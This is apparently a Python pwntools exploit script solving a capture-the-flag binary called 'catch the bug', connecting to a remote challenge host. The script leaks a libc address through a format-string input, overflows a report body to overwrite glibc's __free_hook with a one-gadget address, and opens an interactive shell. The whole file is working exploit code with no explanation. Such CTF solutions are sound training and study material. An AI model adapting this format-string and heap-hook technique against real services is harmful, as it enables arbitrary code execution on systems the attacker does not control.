from pwn import *

def catch_a_bug(name):
	while True:
		r.sendlineafter(">> ", "1")
		r.recvuntil("...\n")
		dat = r.recvuntil("\n", drop=True)
		if "You have caught a bug!" == dat:
			r.sendlineafter(">> ", name)
			break
		else:
			continue

def inspect_the_bug():
	r.sendlineafter(">> ", "2")

def submit_a_report(length):
	r.sendlineafter(">> ", "3")
	r.sendlineafter("title\n", "A" * 0x3f)
	r.sendlineafter("subtitle\n", "A" * 0x7f)
	gap = (0x708 - 0x40 - 0x80 - 24 - length) + 8
	r.sendafter("body\n", "A" * (0x708 - 0x40 - 0x80 - 0x18 - length) + p64(libc + 0x00000000003DC8A8 - gap - 8) + p64(libc + 0x00000000003DA6F8))   # __free_hook
	r.sendafter("tag\n", p64(libc + 0xfccde))	# oneshot
	r.sendafter("password", p64(libc + 0x00000000003DC8A8))	# __free_hook

def main():
	global r
	global libc
	r = remote("catchthebug.eatpwnnosleep.com", 55555)
	# r = process("./bug_3e99623da36874fd424a4e237866e301d292aa66", env={"LD_PRELOAD" : "./libc-2.26.so_cc8df6278e095fcc4ca8a98e1f1c69c04db30a4c"})

	catch_a_bug("%p")	# leak
	catch_a_bug("123")
	catch_a_bug("123")
	inspect_the_bug()
	r.recvuntil("=========================\n")
	libc = int(r.recvuntil("\n", drop=True), 16) - 0x3db7a3	#
	print hex(libc)
	length = 0
	for i in range(3):
		bug = r.recvuntil("\n=", drop=True)
		length += len(bug)
		if i != 2:
			r.recvuntil("123\n")
	if (1584 - length) > 0xf0:
		print "FAIL..."
		main()
	submit_a_report(length)
	r.interactive()

main()
